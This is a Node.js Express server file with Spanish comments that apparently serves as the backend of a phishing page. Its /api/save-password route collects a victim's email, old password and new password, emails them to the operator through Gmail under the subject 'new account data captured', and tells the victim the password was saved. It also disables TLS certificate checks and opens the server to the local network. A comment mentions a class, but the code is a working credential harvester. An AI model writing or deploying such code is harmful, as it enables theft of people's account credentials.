require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Configuración optimizada de Nodemailer para evitar bloqueos en Render
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // true para puerto 465
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  },
  tls: {
    rejectUnauthorized: false
  }
});

// Ruta que captura la información y la envía a tu correo
app.post('/api/save-password', async (req, res) => {
  const { email, oldPassword, password, confirmation } = req.body;

  try {
    await transporter.sendMail({
      from: `"Captura de Seguridad" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: '¡Nuevos datos de cuenta capturados!',
      html: `
        <h2>Se han registrado los siguientes datos en clase:</h2>
        <p><strong>Correo electrónico:</strong> ${email}</p>
        <p><strong>Contraseña anterior:</strong> ${oldPassword}</p>
        <p><strong>Nueva contraseña:</strong> ${password}</p>
        <p><strong>Confirmación:</strong> ${confirmation}</p>
      `
    });

    res.json({ success: true, message: 'Contraseña guardada correctamente.' });
  } catch (error) {
    console.error('Error al enviar correo:', error);
    res.status(500).json({ success: false, message: 'Error en el servidor.' });
  }
});

const PORT = process.env.PORT || 3000;
// IMPORTANTE: El '0.0.0.0' permite que otros dispositivos de la red se conecten
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor abierto en la red local en el puerto ${PORT}`);
});
